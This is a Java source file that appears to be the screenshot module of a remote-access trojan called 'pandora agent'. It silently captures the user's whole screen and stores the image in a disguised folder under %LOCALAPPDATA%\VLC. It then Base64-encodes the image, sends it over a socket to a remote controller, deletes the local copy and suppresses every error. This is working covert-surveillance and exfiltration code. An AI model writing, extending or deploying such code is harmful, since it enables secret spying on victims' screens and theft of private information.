package org.pandora.agent.control.impl;

import org.pandora.agent.Client;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Base64;

public class ScreenshotController {

    private final Client client;

    public ScreenshotController(final Client client) {
        this.client = client;
    }

    public void execute(final String requestId) {
        try {
            final File file = new File(System.getenv("LOCALAPPDATA") + "\\VLC\\x.jpg");
            final BufferedImage bufferedImage = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ImageIO.write(bufferedImage, "JPG", file);
            final FileInputStream imageInFile = new FileInputStream(file);
            byte[] imageData = new byte[(int) file.length()];
            imageInFile.read(imageData);
            imageInFile.close();
            this.client.getSocketUtils().write("screenshot:" + requestId + ":" + Base64.getEncoder().encodeToString(imageData));
            if (file.exists()) file.delete();
        } catch (final IOException | AWTException ignore) {
        }
    }
}
